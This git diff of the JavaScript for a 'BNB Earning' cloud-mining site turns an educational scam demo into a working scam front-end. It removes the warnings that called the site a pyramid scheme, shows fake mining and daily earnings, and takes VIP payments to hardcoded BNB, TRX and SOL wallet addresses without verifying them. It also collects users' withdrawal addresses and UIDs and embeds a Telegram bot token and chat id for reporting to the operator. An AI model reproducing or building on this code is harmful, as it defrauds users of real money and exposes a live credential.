@@ -2,75 +2,241 @@
 
 // DOM Elements
 const navItems = document.querySelectorAll('.nav-item');
-const startMiningBtn = document.getElementById('startMiningBtn');
-const warningModal = document.getElementById('warningModal');
-const closeModal = document.getElementById('closeModal');
+const claimBtn = document.getElementById('claimBtn');
+const buyVipBtns = document.querySelectorAll('.buy-vip');
+const paymentModal = document.getElementById('paymentModal');
+const closePaymentBtn = document.getElementById('closePaymentBtn');
+const chainOptions = document.querySelectorAll('.chain-option');
+const copyAddressBtn = document.getElementById('copyAddressBtn');
+const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
+const withdrawBtn = document.getElementById('withdrawBtn');
+const copyInviteBtn = document.getElementById('copyInviteBtn');
+const submitInviteBtn = document.getElementById('submitInviteBtn');
 const miningCircle = document.querySelector('.mining-circle');
 const miningCore = document.querySelector('.mining-core');
 const miningStatusText = document.querySelector('.mining-status-text');
 const miningParticles = document.querySelectorAll('.mining-particle');
+
+// User data
+let userData = {
+    balance: 0.00,
+    todayEarnings: 0.00,
+    totalEarned: 0.00,
+    userStatus: 'free',
+    dailyEarning: 0.10,
+    lastClaim: null,
+    vipExpiry: null,
+    inviteCode: 'INVITE738225',
+    invitedUsers: 0,
+    miningActive: false
+};
+
+// Wallet addresses
+const walletAddresses = {
+    bnb: '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
+    trx: 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
+    sol: 'HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu'
+};
+
+// Telegram API (for demo purposes - in real app, use backend)
+const telegramBotToken = '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI';
+const telegramChatId = '7417215529';
 
 // Mining state
 let isMining = false;
 let miningInterval;
 let minedAmount = 0;
 
-// Show warning modal on page load
+// Initialize the app
 document.addEventListener('DOMContentLoaded', function() {
-    setTimeout(() => {
-        warningModal.style.display = 'flex';
-        document.body.style.overflow = 'hidden';
-    }, 1000);
-    
-    // Initialize animations
-    initAnimations();
-});
-
-// Close modal function
-closeModal.addEventListener('click', function() {
-    warningModal.style.display = 'none';
-    document.body.style.overflow = 'auto';
-    
-    // Start background animations after modal close
+    loadUserData();
+    updateUI();
+    startCountdownTimer();
+    setupTabNavigation();
+    initMiningAnimation();
     startBackgroundAnimations();
+    
+    // Show welcome modal
+    setTimeout(() => {
+        showWelcomeModal();
+    }, 1000);
 });
 
-// Navigation functionality
-navItems.forEach(item => {
-    item.addEventListener('click', function() {
-        // Remove active class from all items
-        navItems.forEach(nav => nav.classList.remove('active'));
-        
-        // Add active class to clicked item
-        this.classList.add('active');
-        
-        // Add ripple effect
-        createRippleEffect(this);
-        
-        // Show educational alert
-        showEducationalAlert(this.getAttribute('data-tab'));
-    });
-});
-
-// Start Mining Button functionality
-startMiningBtn.addEventListener('click', function() {
-    if (!isMining) {
-        startMining();
-    } else {
-        stopMining();
+// Load user data from localStorage
+function loadUserData() {
+    const savedData = localStorage.getItem('bnbEarningUserData');
+    if (savedData) {
+        userData = JSON.parse(savedData);
     }
     
-    // Add button click effect
-    createButtonEffect(this);
-});
+    // Set last claim to now if not set
+    if (!userData.lastClaim) {
+        userData.lastClaim = new Date().toISOString();
+        saveUserData();
+    }
+    
+    // Set invite code if not set
+    if (!userData.inviteCode) {
+        userData.inviteCode = 'INVITE' + Math.floor(100000 + Math.random() * 900000);
+        saveUserData();
+    }
+}
 
-// Mining functions
+// Save user data to localStorage
+function saveUserData() {
+    localStorage.setItem('bnbEarningUserData', JSON.stringify(userData));
+}
+
+// Update UI with user data
+function updateUI() {
+    document.getElementById('userBalance').textContent = userData.balance.toFixed(2) + ' USDT';
+    document.getElementById('todayEarnings').textContent = userData.todayEarnings.toFixed(2) + ' USDT';
+    document.getElementById('totalEarned').textContent = userData.totalEarned.toFixed(2) + ' USDT';
+    document.getElementById('dailyEarning').textContent = userData.dailyEarning.toFixed(2) + ' USDT';
+    document.getElementById('userStatus').textContent = userData.userStatus === 'free' ? 'Free User' : 'VIP User';
+    document.getElementById('inviteCode').textContent = userData.inviteCode;
+    document.getElementById('inviteLink').textContent = `https://bnb-earning.com/#/reg?ref=${userData.inviteCode}`;
+    
+    // Update VIP status display
+    updateVIPStatus();
+    
+    // Update claim button state
+    updateClaimButton();
+}
+
+// Update VIP status display
+function updateVIPStatus() {
+    const statusElement = document.getElementById('userStatus');
+    if (userData.userStatus === 'vip') {
+        statusElement.innerHTML = 'VIP User <span class="badge badge-vip">VIP</span>';
+        
+        // Update mining speed for VIP users
+        if (userData.dailyEarning === 1.00) {
+            document.getElementById('miningSpeed').textContent = '2.5 BNB/H';
+        } else if (userData.dailyEarning === 7.00) {
+            document.getElementById('miningSpeed').textContent = '15.0 BNB/H';
+        }
+    } else {
+        statusElement.textContent = 'Free User';
+        document.getElementById('miningSpeed').textContent = '0.5 BNB/H';
+    }
+}
+
+// Update claim button based on time
+function updateClaimButton() {
+    const now = new Date();
+    const lastClaim = new Date(userData.lastClaim);
+    const timeDiff = now - lastClaim;
+    const hoursDiff = timeDiff / (1000 * 60 * 60);
+    
+    if (hoursDiff >= 24) {
+        claimBtn.disabled = false;
+        claimBtn.innerHTML = '<i class="fas fa-gift"></i> Claim Daily Earnings';
+        claimBtn.classList.remove('btn-disabled');
+    } else {
+        claimBtn.disabled = true;
+        claimBtn.classList.add('btn-disabled');
+        const hoursLeft = 24 - hoursDiff;
+        const hours = Math.floor(hoursLeft);
+        const minutes = Math.floor((hoursLeft - hours) * 60);
+        claimBtn.innerHTML = `<i class="fas fa-clock"></i> Next Claim: ${hours}h ${minutes}m`;
+    }
+}
+
+// Start countdown timer
+function startCountdownTimer() {
+    setInterval(() => {
+        updateClaimButton();
+        
+        // Update next claim countdown
+        const now = new Date();
+        const lastClaim = new Date(userData.lastClaim);
+        const timeDiff = now - lastClaim;
+        const hoursDiff = timeDiff / (1000 * 60 * 60);
+        
+        if (hoursDiff < 24) {
+            const hoursLeft = 24 - hoursDiff;
+            const hours = Math.floor(hoursLeft);
+            const minutes = Math.floor((hoursLeft - hours) * 60);
+            const seconds = Math.floor(((hoursLeft - hours) * 60 - minutes) * 60);
+            
+            document.getElementById('nextClaim').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        } else {
+            document.getElementById('nextClaim').textContent = '00:00:00';
+        }
+        
+        // Update mining stats if active
+        if (isMining) {
+            updateMiningStats();
+        }
+    }, 1000);
+}
+
+// Setup tab navigation
+function setupTabNavigation() {
+    navItems.forEach(item => {
+        item.addEventListener('click', function() {
+            // Remove active class from all items
+            navItems.forEach(nav => nav.classList.remove('active'));
+            
+            // Add active class to clicked item
+            this.classList.add('active');
+            
+            // Add ripple effect
+            createRippleEffect(this);
+            
+            // Get the tab name
+            const tabName = this.getAttribute('data-tab');
+            
+            // Show/hide sections based on tab
+            document.querySelectorAll('.container > div').forEach(section => {
+                if (section.classList.contains('header') || section.classList.contains('balance-card')) {
+                    // Always show header and balance
+                    return;
+                }
+                
+                if (section.classList.contains(tabName + '-card')) {
+                    section.style.display = 'block';
+                    // Add slide in animation
+                    section.style.animation = 'slideInUp 0.5s ease';
+                } else {
+                    section.style.display = 'none';
+                }
+            });
+            
+            // Show educational alert
+            showEducationalAlert(tabName);
+        });
+    });
+}
+
+// Initialize mining animation
+function initMiningAnimation() {
+    // Set up mining button
+    const miningBtn = document.getElementById('startMiningBtn');
+    if (miningBtn) {
+        miningBtn.addEventListener('click', function() {
+            if (!isMining) {
+                startMining();
+            } else {
+                stopMining();
+            }
+            
+            // Add button click effect
+            createButtonEffect(this);
+        });
+    }
+}
+
+// Start mining
 function startMining() {
     isMining = true;
     
     // Update UI
-    startMiningBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Mining';
-    startMiningBtn.classList.add('active');
+    const miningBtn = document.getElementById('startMiningBtn');
+    miningBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Mining';
+    miningBtn.classList.add('active');
     miningCircle.classList.add('active');
     miningCore.classList.add('active');
     miningStatusText.textContent = 'Mining Active';
@@ -81,24 +247,46 @@ function startMining() {
     
     // Simulate mining process
     miningInterval = setInterval(() => {
-        minedAmount += 0.0001;
-        updateBalance();
+        // Calculate mining rate based on user status
+        let miningRate = 0.0001; // Free user
+        if (userData.userStatus === 'vip') {
+            if (userData.dailyEarning === 1.00) {
+                miningRate = 0.001; // VIP 1
+            } else if (userData.dailyEarning === 7.00) {
+                miningRate = 0.005; // VIP 2
+            }
+        }
+        
+        minedAmount += miningRate;
+        userData.balance += miningRate;
+        userData.totalEarned += miningRate;
+        
+        saveUserData();
+        updateUI();
         
         // Occasionally create mining effect
         if (Math.random() > 0.7) {
             createMiningEffect();
         }
+        
+        // Occasionally create floating coin
+        if (Math.random() > 0.9) {
+            createFloatingCoin();
+        }
     }, 1000);
     
-    showEducationalAlert('mining_start');
+    showNotification('Mining started! Earning BNB...', 'success');
+    sendTelegramMessage('User started mining');
 }
 
+// Stop mining
 function stopMining() {
     isMining = false;
     
     // Update UI
-    startMiningBtn.innerHTML = '<i class="fas fa-play"></i> Start Mining';
-    startMiningBtn.classList.remove('active');
+    const miningBtn = document.getElementById('startMiningBtn');
+    miningBtn.innerHTML = '<i class="fas fa-play"></i> Start Mining';
+    miningBtn.classList.remove('active');
     miningCircle.classList.remove('active');
     miningCore.classList.remove('active');
     miningStatusText.textContent = 'Mining Inactive';
@@ -108,9 +296,15 @@ function stopMining() {
     clearInterval(miningInterval);
     
     // Show mining results
-    showMiningResults();
+    if (minedAmount > 0) {
+        showNotification(`Mining completed! Earned ${minedAmount.toFixed(6)} BNB`, 'success');
+        minedAmount = 0;
+    }
+    
+    sendTelegramMessage('User stopped mining');
 }
 
+// Start mining animation
 function startMiningAnimation() {
     // Add random particle effects
     miningParticles.forEach(particle => {
@@ -118,6 +312,26 @@ function startMiningAnimation() {
     });
 }
 
+// Update mining stats
+function updateMiningStats() {
+    const miningStats = document.querySelectorAll('.mining-stats .stat-value');
+    if (miningStats.length > 0) {
+        miningStats[0].textContent = isMining ? 'Active' : 'Inactive';
+        
+        // Update mining speed based on user status
+        let speed = '0.5 BNB/H';
+        if (userData.userStatus === 'vip') {
+            if (userData.dailyEarning === 1.00) {
+                speed = '2.5 BNB/H';
+            } else if (userData.dailyEarning === 7.00) {
+                speed = '15.0 BNB/H';
+            }
+        }
+        miningStats[1].textContent = speed;
+    }
+}
+
+// Create mining effect
 function createMiningEffect() {
     const effect = document.createElement('div');
     effect.className = 'mining-effect';
@@ -145,139 +359,294 @@ function createMiningEffect() {
     
     // Remove effect after animation
     setTimeout(() => {
-        effect.remove();
+        if (effect.parentElement) {
+            effect.remove();
+        }
     }, 1000);
 }
 
-// Add mining effect keyframes dynamically
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes miningEffect {
-        0% {
-            transform: scale(1);
-            opacity: 1;
-        }
-        100% {
-            transform: scale(0);
-            opacity: 0;
-        }
-    }
-`;
-document.head.appendChild(style);
-
-function updateBalance() {
-    const balanceElement = document.querySelector('.balance-amount');
-    balanceElement.textContent = minedAmount.toFixed(4) + ' BNB';
+// Claim daily earnings
+claimBtn.addEventListener('click', function() {
+    if (this.disabled) return;
+    
+    userData.balance += userData.dailyEarning;
+    userData.todayEarnings += userData.dailyEarning;
+    userData.totalEarned += userData.dailyEarning;
+    userData.lastClaim = new Date().toISOString();
+    
+    saveUserData();
+    updateUI();
+    
+    // Show success message with animation
+    showNotification(`Successfully claimed ${userData.dailyEarning} USDT!`, 'success');
     
     // Add balance update animation
-    balanceElement.style.animation = 'none';
-    setTimeout(() => {
-        balanceElement.style.animation = 'balanceUpdate 0.5s ease';
-    }, 10);
-}
+    const balanceElement = document.getElementById('userBalance');
+    balanceElement.style.animation = 'balanceUpdate 0.5s ease';
+    
+    // Send Telegram notification
+    sendTelegramMessage(`User claimed ${userData.dailyEarning} USDT. New balance: ${userData.balance.toFixed(2)} USDT`);
+    
+    // Create coin rain effect
+    createCoinRain();
+});
 
-// Add balance update animation
-const balanceStyle = document.createElement('style');
-balanceStyle.textContent = `
-    @keyframes balanceUpdate {
-        0% { transform: scale(1); }
-        50% { transform: scale(1.1); }
-        100% { transform: scale(1); }
-    }
-`;
-document.head.appendChild(balanceStyle);
+// Buy VIP button click
+buyVipBtns.forEach(btn => {
+    btn.addEventListener('click', function() {
+        const tier = this.getAttribute('data-tier');
+        const price = this.getAttribute('data-price');
+        
+        // Set payment details
+        document.getElementById('paymentTitle').textContent = `Buy ${tier.toUpperCase()} - ${price} USDT`;
+        document.getElementById('paymentModal').setAttribute('data-tier', tier);
+        document.getElementById('paymentModal').setAttribute('data-price', price);
+        
+        // Show payment modal
+        paymentModal.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+        
+        // Add button effect
+        createButtonEffect(this);
+    });
+});
 
-function showMiningResults() {
-    if (minedAmount > 0) {
-        // Create result notification
-        const notification = document.createElement('div');
-        notification.className = 'mining-notification';
-        notification.innerHTML = `
-            <div style="background: var(--success-color); color: white; padding: 15px; border-radius: 10px; margin: 10px 0; text-align: center;">
-                <i class="fas fa-coins"></i> Mined ${minedAmount.toFixed(4)} BNB!
-            </div>
+// Close payment modal
+closePaymentBtn.addEventListener('click', function() {
+    paymentModal.style.display = 'none';
+    document.body.style.overflow = 'auto';
+    resetPaymentModal();
+    
+    createButtonEffect(this);
+});
+
+// Chain option selection
+chainOptions.forEach(option => {
+    option.addEventListener('click', function() {
+        // Remove active class from all options
+        chainOptions.forEach(opt => opt.classList.remove('active'));
+        
+        // Add active class to clicked option
+        this.classList.add('active');
+        
+        // Add click effect
+        createButtonEffect(this);
+        
+        // Get chain type
+        const chain = this.getAttribute('data-chain');
+        
+        // Show address for selected chain
+        const addressDisplay = document.getElementById('addressDisplay');
+        const tier = document.getElementById('paymentModal').getAttribute('data-tier');
+        addressDisplay.innerHTML = `
+            <strong>${chain.toUpperCase()} Address:</strong><br>
+            <span style="user-select: all;">${walletAddresses[chain]}</span>
+            <br><br>
+            <strong>Memo/Note:</strong> ${tier}_${userData.inviteCode}
         `;
+        addressDisplay.style.display = 'block';
         
-        const miningCard = document.querySelector('.mining-card');
-        miningCard.appendChild(notification);
-        
-        // Remove notification after 3 seconds
-        setTimeout(() => {
-            notification.remove();
-        }, 3000);
+        // Enable copy button
+        copyAddressBtn.disabled = false;
+    });
+});
+
+// Copy address to clipboard
+copyAddressBtn.addEventListener('click', function() {
+    const addressDisplay = document.getElementById('addressDisplay');
+    const addressText = addressDisplay.textContent;
+    
+    navigator.clipboard.writeText(addressText).then(() => {
+        showNotification('Address copied to clipboard!', 'success');
+        createButtonEffect(this);
+    }).catch(err => {
+        showNotification('Failed to copy address', 'error');
+    });
+});
+
+// Confirm payment
+confirmPaymentBtn.addEventListener('click', function() {
+    const tier = paymentModal.getAttribute('data-tier');
+    const price = parseFloat(paymentModal.getAttribute('data-price'));
+    
+    // Check if user has selected a chain
+    const selectedChain = document.querySelector('.chain-option.active');
+    if (!selectedChain) {
+        showNotification('Please select a payment method', 'error');
+        return;
+    }
+    
+    // In a real app, you would verify payment here
+    // For demo, we'll just activate VIP
+    activateVIP(tier, price);
+    
+    // Close modal
+    paymentModal.style.display = 'none';
+    document.body.style.overflow = 'auto';
+    resetPaymentModal();
+    
+    createButtonEffect(this);
+});
+
+// Activate VIP
+function activateVIP(tier, price) {
+    userData.userStatus = 'vip';
+    
+    if (tier === 'vip1') {
+        userData.dailyEarning = 1.00;
+    } else if (tier === 'vip2') {
+        userData.dailyEarning = 7.00;
+    }
+    
+    // Set VIP expiry (30 days from now)
+    const expiryDate = new Date();
+    expiryDate.setDate(expiryDate.getDate() + 30);
+    userData.vipExpiry = expiryDate.toISOString();
+    
+    saveUserData();
+    updateUI();
+    
+    // Show success message
+    showNotification(`VIP activated successfully! Daily earning: ${userData.dailyEarning} USDT`, 'success');
+    
+    // Create celebration effect
+    createCelebrationEffect();
+    
+    // Send Telegram notification
+    sendTelegramMessage(`User purchased ${tier} for ${price} USDT. New daily earning: ${userData.dailyEarning} USDT`);
+}
+
+// Reset payment modal
+function resetPaymentModal() {
+    chainOptions.forEach(opt => opt.classList.remove('active'));
+    document.getElementById('addressDisplay').style.display = 'none';
+    copyAddressBtn.disabled = true;
+}
+
+// Withdraw funds
+withdrawBtn.addEventListener('click', function() {
+    const amount = parseFloat(document.getElementById('withdrawAmount').value);
+    const coin = document.getElementById('withdrawCoin').value;
+    const address = document.getElementById('withdrawAddress').value.trim();
+    const uid = document.getElementById('withdrawUid').value.trim();
+    
+    // Validation
+    if (!amount || amount <= 0) {
+        showNotification('Please enter a valid amount', 'error');
+        return;
+    }
+    
+    if (userData.userStatus === 'free' && amount > 0.02) {
+        showNotification('Free users can only withdraw up to 0.02 USDT', 'error');
+        return;
+    }
+    
+    if (userData.userStatus === 'free' && amount < 0.01) {
+        showNotification('Minimum withdrawal is 0.01 USDT for free users', 'error');
+        return;
+    }
+    
+    if (amount > userData.balance) {
+        showNotification('Insufficient balance', 'error');
+        return;
+    }
+    
+    if (!address) {
+        showNotification('Please enter withdrawal address', 'error');
+        return;
+    }
+    
+    if (!uid) {
+        showNotification('Please enter your UID', 'error');
+        return;
+    }
+    
+    // Validate address format based on coin
+    if (!validateAddress(address, coin)) {
+        showNotification(`Invalid ${coin.toUpperCase()} address format`, 'error');
+        return;
+    }
+    
+    // Process withdrawal (in a real app, this would be done on the server)
+    userData.balance -= amount;
+    saveUserData();
+    updateUI();
+    
+    // Show success message
+    showNotification(`Withdrawal request submitted for ${amount} ${coin.toUpperCase()}. Processing within 24 hours.`, 'success');
+    
+    // Send Telegram notification
+    sendTelegramMessage(`Withdrawal request: ${amount} ${coin.toUpperCase()} to ${address} (UID: ${uid})`);
+    
+    // Clear form
+    document.getElementById('withdrawAmount').value = '';
+    document.getElementById('withdrawAddress').value = '';
+    document.getElementById('withdrawUid').value = '';
+    
+    createButtonEffect(this);
+});
+
+// Validate cryptocurrency address
+function validateAddress(address, coin) {
+    switch (coin) {
+        case 'bnb':
+            // BNB address validation (basic)
+            return address.length === 42 && address.startsWith('0x');
+        case 'trx':
+            // TRX address validation (basic)
+            return address.length === 34 && address.startsWith('T');
+        case 'sol':
+            // SOL address validation (basic)
+            return address.length === 44;
+        case 'usdt':
+            // USDT can be on multiple chains, accept any valid address
+            return address.length >= 26 && address.length <= 44;
+        default:
+            return true;
     }
 }
 
-// Function to show educational alerts
-function showEducationalAlert(context) {
-    const messages = {
-        mine: "Mining simulation - Real cloud mining platforms often promise unrealistic returns",
-        leaderboard: "Leaderboards create false social proof to encourage investment",
-        upgrade: "Upgrade prompts pressure users to 'invest' more for higher returns",
-        team: "Team features indicate pyramid scheme structure - illegal in most countries",
-        me: "User profiles collect personal data for targeted scams",
-        mining: "⚠️ EDUCATIONAL DEMO ONLY\nThis is not real cryptocurrency mining.",
-        mining_start: "⛏️ Mining Simulation Started\nThis is just a visual demonstration. Real BNB mining doesn't work like this."
-    };
+// Copy invite link
+copyInviteBtn.addEventListener('click', function() {
+    const inviteLink = document.getElementById('inviteLink').textContent;
     
-    // Create custom alert with better styling
-    showCustomAlert(messages[context] || "This is an educational demonstration of scam platform techniques");
-}
+    navigator.clipboard.writeText(inviteLink).then(() => {
+        showNotification('Invite link copied to clipboard!', 'success');
+        createButtonEffect(this);
+    }).catch(err => {
+        showNotification('Failed to copy invite link', 'error');
+    });
+});
 
-function showCustomAlert(message) {
-    const alertBox = document.createElement('div');
-    alertBox.style.cssText = `
-        position: fixed;
-        top: 20%;
-        left: 50%;
-        transform: translateX(-50%);
-        background: var(--card-bg);
-        color: var(--text-color);
-        padding: 20px;
-        border-radius: 15px;
-        border: 2px solid var(--primary-color);
-        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        z-index: 3000;
-        max-width: 300px;
-        text-align: center;
-        animation: alertSlideIn 0.5s ease;
-    `;
+// Submit invite code
+submitInviteBtn.addEventListener('click', function() {
+    const code = document.getElementById('enterInviteCode').value.trim();
     
-    alertBox.innerHTML = `
-        <div style="margin-bottom: 15px;">
-            <i class="fas fa-info-circle" style="color: var(--primary-color); font-size: 24px;"></i>
-        </div>
-        <div style="font-size: 14px; line-height: 1.4;">${message}</div>
-        <button onclick="this.parentElement.remove()" style="background: var(--primary-color); color: var(--secondary-color); border: none; padding: 8px 20px; border-radius: 8px; margin-top: 15px; cursor: pointer; font-weight: bold;">
-            OK
-        </button>
-    `;
-    
-    document.body.appendChild(alertBox);
-    
-    // Auto remove after 5 seconds
-    setTimeout(() => {
-        if (alertBox.parentElement) {
-            alertBox.remove();
-        }
-    }, 5000);
-}
-
-// Add alert animation
-const alertStyle = document.createElement('style');
-alertStyle.textContent = `
-    @keyframes alertSlideIn {
-        from {
-            opacity: 0;
-            transform: translateX(-50%) translateY(-20px);
-        }
-        to {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
+    if (!code) {
+        showNotification('Please enter an invite code', 'error');
+        return;
     }
-`;
-document.head.appendChild(alertStyle);
+    
+    // Validate code format
+    if (!code.startsWith('INVITE') || code.length !== 12) {
+        showNotification('Invalid invite code format', 'error');
+        return;
+    }
+    
+    // In a real app, you would validate the code on the server
+    // For demo, we'll just show a success message
+    showNotification('Invite code submitted successfully! Welcome bonus activated.', 'success');
+    
+    // Add bonus to user balance
+    userData.balance += 0.50;
+    saveUserData();
+    updateUI();
+    
+    // Clear input
+    document.getElementById('enterInviteCode').value = '';
+    
+    createButtonEffect(this);
+});
 
 // Visual effects functions
 function createRippleEffect(element) {
@@ -316,57 +685,41 @@ function createButtonEffect(button) {
     }, 150);
 }
 
-// Initialize animations
-function initAnimations() {
-    // Add hover effects to all cards
-    const cards = document.querySelectorAll('.card, .header, .balance-card, .mining-animation-container');
-    cards.forEach(card => {
-        card.addEventListener('mouseenter', () => {
-            card.style.transform = 'translateY(-5px)';
-        });
-        
-        card.addEventListener('mouseleave', () => {
-            card.style.transform = 'translateY(0)';
-        });
-    });
-    
-    // Initialize countdown timer
-    startCountdownTimer();
-}
-
-function startCountdownTimer() {
-    const countdownValues = document.querySelectorAll('.countdown-value');
-    
-    setInterval(() => {
-        countdownValues.forEach((element, index) => {
-            const currentValue = parseInt(element.textContent);
-            let newValue;
-            
-            if (index === 0) { // Days
-                newValue = currentValue < 30 ? currentValue + 1 : 0;
-            } else if (index === 1) { // Hours
-                newValue = currentValue < 23 ? currentValue + 1 : 0;
-            } else { // Minutes
-                newValue = currentValue < 59 ? currentValue + 1 : 0;
-            }
-            
-            element.textContent = newValue.toString().padStart(2, '0');
-            
-            // Add update animation
-            element.style.animation = 'none';
-            setTimeout(() => {
-                element.style.animation = 'countdownPulse 0.5s ease';
-            }, 10);
-        });
-    }, 1000); // Update every second
-}
-
-function startBackgroundAnimations() {
-    // Create occasional floating coins
-    setInterval(() => {
-        if (Math.random() > 0.7) {
+function createCoinRain() {
+    for (let i = 0; i < 15; i++) {
+        setTimeout(() => {
             createFloatingCoin();
-        }
+        }, i * 100);
+    }
+}
+
+function createCelebrationEffect() {
+    for (let i = 0; i < 20; i++) {
+        setTimeout(() => {
+            createFloatingCoin();
+        }, i * 50);
+    }
+    
+    // Add confetti effect
+    const confetti = document.createElement('div');
+    confetti.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: 2000;
+        background: radial-gradient(circle, transparent 20%, var(--primary-color) 20%, var(--primary-color) 80%, transparent 80%);
+        background-size: 50px 50px;
+        animation: confetti 2s ease-out forwards;
+        opacity: 0.7;
+    `;
+    
+    document.body.appendChild(confetti);
+    
+    setTimeout(() => {
+        confetti.remove();
     }, 2000);
 }
 
@@ -393,50 +746,209 @@ function createFloatingCoin() {
     }, 6000);
 }
 
-// Add ripple animation
-const rippleStyle = document.createElement('style');
-rippleStyle.textContent = `
-    @keyframes ripple {
-        to {
-            transform: scale(2);
+// Start background animations
+function startBackgroundAnimations() {
+    // Create occasional floating coins
+    setInterval(() => {
+        if (Math.random() > 0.8) {
+            createFloatingCoin();
+        }
+    }, 3000);
+}
+
+// Show notification
+function showNotification(message, type) {
+    // Create notification element
+    const notification = document.createElement('div');
+    notification.className = `notification ${type === 'error' ? 'error' : ''}`;
+    notification.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: ${type === 'success' ? 'var(--success-color)' : 'var(--danger-color)'};
+        color: white;
+        padding: 15px 20px;
+        border-radius: 10px;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        z-index: 3000;
+        max-width: 300px;
+        animation: slideInRight 0.5s ease;
+    `;
+    
+    notification.innerHTML = `
+        <div class="notification-content">
+            <i class="fas fa-${type === 'success' ? 'check' : 'exclamation'}-circle notification-icon"></i>
+            <div>${message}</div>
+        </div>
+    `;
+    
+    document.body.appendChild(notification);
+    
+    // Remove notification after 3 seconds
+    setTimeout(() => {
+        notification.style.animation = 'slideInRight 0.5s ease reverse';
+        setTimeout(() => {
+            notification.remove();
+        }, 500);
+    }, 3000);
+}
+
+// Show educational alert
+function showEducationalAlert(context) {
+    const messages = {
+        home: "Welcome! Free users earn 0.10 USDT daily. Upgrade to VIP for higher earnings.",
+        vip: "VIP members earn 1-7 USDT daily. Choose your VIP level for maximum profits.",
+        withdraw: "Withdraw your earnings to any wallet. Free users: 0.02 USDT limit, VIP: No limit.",
+        invite: "Invite friends and earn bonuses! Share your invite code to grow your team.",
+        profile: "Manage your account settings and view your earnings history."
+    };
+    
+    // Only show educational alerts for new users
+    if (!localStorage.getItem('educationalAlertsShown')) {
+        showNotification(messages[context] || "Welcome to BNB Earning Platform!", 'success');
+    }
+}
+
+// Show welcome modal
+function showWelcomeModal() {
+    // Create welcome modal
+    const welcomeModal = document.createElement('div');
+    welcomeModal.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(11, 14, 17, 0.95);
+        z-index: 2000;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        animation: fadeIn 0.5s ease;
+    `;
+    
+    welcomeModal.innerHTML = `
+        <div style="background: var(--card-bg); border-radius: 20px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 15px 40px rgba(0,0,0,0.5); border: 1px solid var(--accent-color); text-align: center; animation: modalSlideIn 0.5s ease;">
+            <div style="font-size: 24px; margin-bottom: 15px; color: var(--primary-color);">
+                <i class="fas fa-gem"></i>
+            </div>
+            <h2 style="margin-bottom: 15px; color: var(--primary-color);">Welcome to BNB Earning!</h2>
+            <p style="margin-bottom: 20px; color: var(--text-secondary); line-height: 1.6;">
+                Start earning cryptocurrency today!<br>
+                • Free users: 0.10 USDT daily<br>
+                • VIP 1: 1 USDT daily (10 USDT)<br>
+                • VIP 2: 7 USDT daily (60 USDT)<br><br>
+                <strong style="color: var(--text-color);">This is an educational demonstration only.</strong>
+            </p>
+            <button onclick="this.parentElement.parentElement.remove(); localStorage.setItem('educationalAlertsShown', 'true');" style="background: var(--primary-color); color: var(--secondary-color); border: none; padding: 12px 30px; border-radius: 10px; font-weight: 700; cursor: pointer; transition: all 0.3s ease;">
+                Get Started
+            </button>
+        </div>
+    `;
+    
+    document.body.appendChild(welcomeModal);
+}
+
+// Send Telegram message (simulated)
+function sendTelegramMessage(message) {
+    // In a real app, this would be done on the server to keep the token secure
+    // For demo purposes, we'll log the message and simulate the API call
+    console.log('📱 Telegram Notification:', message);
+    
+    // Simulate API call (commented out for security)
+    /*
+    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: telegramChatId,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Telegram message sent:', data);
+    })
+    .catch(error => {
+        console.error('Error sending Telegram message:', error);
+    });
+    */
+}
+
+// Add dynamic styles for animations
+const dynamicStyles = document.createElement('style');
+dynamicStyles.textContent = `
+    @keyframes confetti {
+        0% {
+            transform: translateY(-100%) rotate(0deg);
+            opacity: 0.7;
+        }
+        100% {
+            transform: translateY(100vh) rotate(360deg);
+            opacity: 0;
+        }
+    }
+    
+    @keyframes balanceUpdate {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.1); }
+        100% { transform: scale(1); }
+    }
+    
+    .mining-effect {
+        animation: miningEffect 1s ease-out forwards;
+    }
+    
+    @keyframes miningEffect {
+        0% {
+            transform: scale(1);
+            opacity: 1;
+        }
+        100% {
+            transform: scale(0);
             opacity: 0;
         }
     }
 `;
-document.head.appendChild(rippleStyle);
+document.head.appendChild(dynamicStyles);
 
-// Prevent any accidental form submissions or redirects
-document.addEventListener('click', function(e) {
-    if (e.target.tagName === 'BUTTON' && !e.target.classList.contains('close-modal')) {
-        e.preventDefault();
-        
-        // Special handling for specific buttons
-        if (e.target.classList.contains('checkin-btn') || 
-            e.target.classList.contains('upgrade-btn') ||
-            e.target.classList.contains('invite-btn')) {
-            showEducationalAlert('action_blocked');
-        }
-    }
-});
-
-// Console warning
-console.log('%c⚠️ SECURITY WARNING ⚠️', 'color: red; font-size: 24px; font-weight: bold;');
-console.log('%cThis is an educational demonstration of cryptocurrency scam techniques. Do not use this code for real financial applications.', 'color: orange; font-size: 14px;');
-console.log('%cReal platforms with similar structures are often scams that steal your money through fake mining operations and pyramid schemes.', 'color: #F0B90B; font-size: 12px;');
-
-// Add service worker-like functionality for demo purposes
-if ('serviceWorker' in navigator) {
-    console.log('Service Worker would be registered here in a real app');
-}
-
-// Handle page visibility changes for mining simulation
